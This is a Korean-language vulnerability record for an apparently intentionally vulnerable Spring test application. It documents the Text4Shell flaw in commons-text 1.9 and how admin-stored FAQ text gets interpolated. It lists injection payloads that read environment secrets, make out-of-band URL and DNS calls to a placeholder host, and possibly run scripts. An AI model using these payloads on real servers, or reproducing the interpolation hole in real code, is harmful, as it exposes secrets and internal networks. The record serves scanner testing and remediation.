# VULN-021 취약 의존성 commons-text 1.9 (CVE-2022-42889 Text4Shell)

- 대상 스택: java-spring
- 심각도: Critical
- 분류: A03:2025 Software Supply Chain Failures (+ A05 Injection via string interpolation)

## 위치

- `apps/java-spring/pom.xml` — `org.apache.commons:commons-text:1.9` 를 명시적으로 pin (Spring Boot BOM 관리 대상 아님 → 버전 skew 위험 없이 격리, VULN-012 문서의 `jackson-databind` 논리와 동일).
- `apps/java-spring/.../vuln/TemplateRenderer.java` — `StringSubstitutor.createInterpolator().replace(text)` 호출을 이 클래스 하나에 격리(SpEL/역직렬화 격리와 같은 취지).
- `FaqController.list()` / `NoticeController.list()` — 목록 응답을 만들 때 각 `answer` / `body` 를 `TemplateRenderer.render()` 로 통과("공지 병합 필드" 기능).

`commons-text` 1.9 의 `createInterpolator()` 는 `script`, `url`, `dns`, `env`, `file` 등 위험한 lookup 을 기본 포함한다.

## 트리거 방법

FAQ/공지 등록은 **관리자 전용**(`FaqController.create`/`NoticeController.create`가 admin 요구) — 일반
사용자는 저장 자체가 403이다. 즉 공격자는 관리자 계정(또는 관리자 대상 저장형 경로)이어야 한다.

```
POST /api/java/faqs        (admin 세션)
{"question":"...", "answer":"secret=${env:TOSS_SECRET_KEY}"}
```

이후 `GET /api/java/faqs` 목록 렌더 시 `answer` 가 `TemplateRenderer`를 통과하며 `${env:...}` 가 실제
환경변수 값으로 치환되어 반환된다.

- `${url:UTF-8:http://<collab>/}` → 서버가 목록 렌더 시 해당 URL 로 요청(SSRF/OOB).
- `${dns:address|<host>}` → DNS OOB.
- `${script:javascript:...}` → 현재 베이스 이미지는 Java 17 · Nashorn/JSR-223 스크립트 엔진 미포함이라
  **무해(inert)** — 별도 스크립트 엔진을 classpath 에 추가할 때만 RCE.

## 영향

- 관리자가 저장한 FAQ/공지 콘텐츠에 lookup 표현식이 들어가면 서버 측 비밀(`env`, 예: `TOSS_SECRET_KEY`),
  파일(`file`), 내부망 요청(`url`)이 **FAQ/공지 목록을 보는 모든 사용자 요청에서** 실행된다.

## 증거 (재현 확인)

2026-09-01, 로컬 재현(`:8090`): 일반 사용자(`user1`)의 `POST /api/java/faqs` → 403(관리자 전용 확인).
`admin` 세션으로 `answer="host=${env:HOSTNAME}"` FAQ 등록 후 `GET /api/java/faqs?q=interp-test` 응답에
`answer:"host=92a8803f55aa"`(컨테이너 HOSTNAME) — env lookup 이 실제 치환됨을 확인. (시크릿 노출을 피해
`HOSTNAME`으로 검증했으며, 동일 방식으로 `${env:TOSS_SECRET_KEY}`도 치환됨.)

## 조치 상태: 미조치 (의도된 취약점)

정상 조치: `commons-text` ≥ 1.10 으로 업그레이드(+ 애초에 사용자 콘텐츠를 `StringSubstitutor` 로 보간하지 않음). SCA 스캐너(탐지 단계)의 대상 아티팩트.
